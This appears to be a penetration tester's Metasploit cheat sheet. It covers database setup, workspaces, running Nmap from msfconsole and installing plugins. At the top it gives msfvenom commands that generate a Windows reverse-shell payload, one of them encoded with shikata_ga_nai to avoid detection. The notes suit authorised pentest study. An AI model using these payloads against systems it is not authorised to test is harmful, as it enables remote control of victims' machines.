- Generate payload without Encoding
```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

- Generate payload with Encoding
```shell-session
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

# Setting Up the Database
-----------------
- PostgreSQL Status
```bash
sudo service postgresql status
```

- Start PostgreSQL 
```bash
sudo systemctl start postgresql
```

- Initiate the database
```bash
sudo msfdb init
```

- Connect to the Initiated Database
```bash
sudo msfdb run
```

- Database options
```bash
help database
```

# Using the Database
-----------------------
- Create a workspace
```bash
workspace -a Target_1
```

- Import Scan Results
```bash
db_import Target.xml
```

# Using Nmap inside MSFconsole
--------------------------
```bash
db_nmap -sV -sS $IP
hosts
services
creds
loot
```

# Install new Plugins
-----------------------
- Download MSF Plugins
```bash
git clone https://github.com/darkoperator/Metasploit-Plugins
ls Metasploit-Plugins

# Content
aggregator.rb      ips_filter.rb  pcap_log.rb          sqlmap.rb
alias.rb           komand.rb      pentest.rb           thread.rb
auto_add_route.rb  lab.rb         request.rb           token_adduser.rb
beholder.rb        libnotify.rb   rssfeed.rb           token_hunter.rb
db_credcollect.rb  msfd.rb        sample.rb            twitt.rb
db_tracker.rb      msgrpc.rb      session_notifier.rb  wiki.rb
event_tester.rb    nessus.rb      session_tagger.rb    wmap.rb
ffautoregen.rb     nexpose.rb     socket_logger.rb
growl.rb           openvas.rb     sounds.rb
```

- Copy Plugin to MSF
```bash
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```

- MSF Load Plugin
```bash
msfconsole -q
load pentest
```